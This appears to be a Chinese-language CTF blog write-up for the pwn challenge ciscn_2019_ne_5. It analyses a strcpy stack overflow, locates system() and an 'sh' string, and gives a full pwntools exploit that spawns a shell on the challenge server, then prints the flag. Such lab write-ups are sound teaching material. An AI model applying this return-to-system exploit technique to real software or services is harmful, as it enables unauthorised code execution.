---
title: ciscn_2019_ne_5
date: 2023-10-24
categories:
  - CTF
  - Pwn
---

## 前置工作

先 CheckSec，结果如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec ciscn_2019_ne_5
[*] '/home/ela/Pwn/ciscn_2019_ne_5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

再用 IDA 打开看看主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-100h] BYREF
  char src[4]; // [esp+4h] [ebp-FCh] BYREF
  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
  char v8[96]; // [esp+88h] [ebp-78h] BYREF
  int *v9; // [esp+F4h] [ebp-Ch]

  v9 = &argc;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  fflush(stdout);
  *(_DWORD *)s1 = 48;
  memset(v8, 0, sizeof(v8));
  *(_DWORD *)src = 0x30;
  memset(v6, 0, sizeof(v6));
  puts("Welcome to use LFS.");
  printf("Please input admin password:");
  __isoc99_scanf("%100s", s1);
  if ( strcmp(s1, "administrator") )
  {
    puts("Password Error!");
    exit(0);
  }
  puts("Welcome!");
  puts("Input your operation:");
  puts("1.Add a log.");
  puts("2.Display all logs.");
  puts("3.Print all logs.");
  printf("0.Exit\n:");
  __isoc99_scanf("%d", &v4);
  switch ( v4 )
  {
    case 0:
      exit(0);
      return result;
    case 1:
      AddLog((int)src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 2:
      Display(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 3:
      Print();
      result = sub_804892B(argc, argv, envp);
      break;
    case 4:
      GetFlag(src);
      result = sub_804892B(argc, argv, envp);
      break;
    default:
      result = sub_804892B(argc, argv, envp);
      break;
  }
  return result;
}
```

感觉有点多，先跑一次试试看

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ ./ciscn_2019_ne_5
Welcome to use LFS.
Please input admin password:administrator
Welcome!
Input your operation:
1.Add a log.
2.Display all logs.
3.Print all logs.
0.Exit
:
```

这个 `admin password` 就是 `administrator`，这个看看上面的主程序就能知道，重点在下面

这里面没有提供 `4` 选项，但从主程序上面我们可以看出来选 `4` 的时候可以 `GetFlag()`，那我们就先试试看

```
The flag is your log:0
```

这里说 `The flag is your log`，说明我们应该添加一条 `log` 再陪他玩，那就暂时由不得我们了，我们先去看看 `AddLog()` 函数长啥样

```c
int __cdecl AddLog(int a1)
{
  printf("Please input new log info:");
  return __isoc99_scanf("%128s", a1);
}
```

感觉也没啥，就是把最大长度 128 的字符串存到传进来的变量中，再看看 `GetFlag()` 长啥样

## `strcpy()` 溢出

```c
int __cdecl GetFlag(char *src)
{
  char dest[4]; // [esp+0h] [ebp-48h] BYREF
  char v3[60]; // [esp+4h] [ebp-44h] BYREF

  *(_DWORD *)dest = 48;
  memset(v3, 0, sizeof(v3));
  strcpy(dest, src);
  return printf("The flag is your log:%s\n", dest);
}
```

这里就出现了会导致栈溢出的函数 `strcpy()`，正如他的名字一样，复制字符串，把 `src` 的内容复制到 `dest` 里

如果你看一看主程序，你就会发现，`AddLog()` 和 `GetFlag()` 都用了同样的参数 `src`，也就是说，我们可以传入一个大于 `0x48` 的东西造成 `dest` 那边的栈溢出，这两边是互通的

## 寻找地址

首先我们需要一个 `system()` 函数，这个很简单，很快就找到了，在 `0x80484D0`

还要一个 `/bin/sh` 字符串，Shift + F12 找来找去发现没有，所以用 ROPgadget 来找一找

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ ROPgadget --binary ciscn_2019_ne_5 --string '/bin/sh'
Strings information
============================================================
```

本来以为要 ret2libc 了，但是 ROPgadget 找到了 `sh` 字符串，也算是一种 `/bin/sh` 的平替了

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ ROPgadget --binary ciscn_2019_ne_5 --string 'sh' 
Strings information
============================================================
0x080482ea : sh
```

这样东西就齐了

## 编写 Exp

```python
from pwn import *

p32 = lambda x: pack(x, 32)

io = remote("node4.buuoj.cn", 26228)

main_addr = 0x8048722
system_addr = 0x80484D0
sh_addr = 0x80482EA

io.sendlineafter("Please input admin password:", "administrator")
io.sendlineafter("0.Exit\n:", "1")

payload = b"A"*(0x48+0x4) + p32(system_addr) + p32(main_addr) + p32(sh_addr)
io.sendlineafter("info:", payload)

io.sendlineafter("0.Exit\n:", "4")
io.interactive()

```

最后得到的 Flag 是 `flag{1b1d17cc-fc42-42f1-8692-f44e99877151}`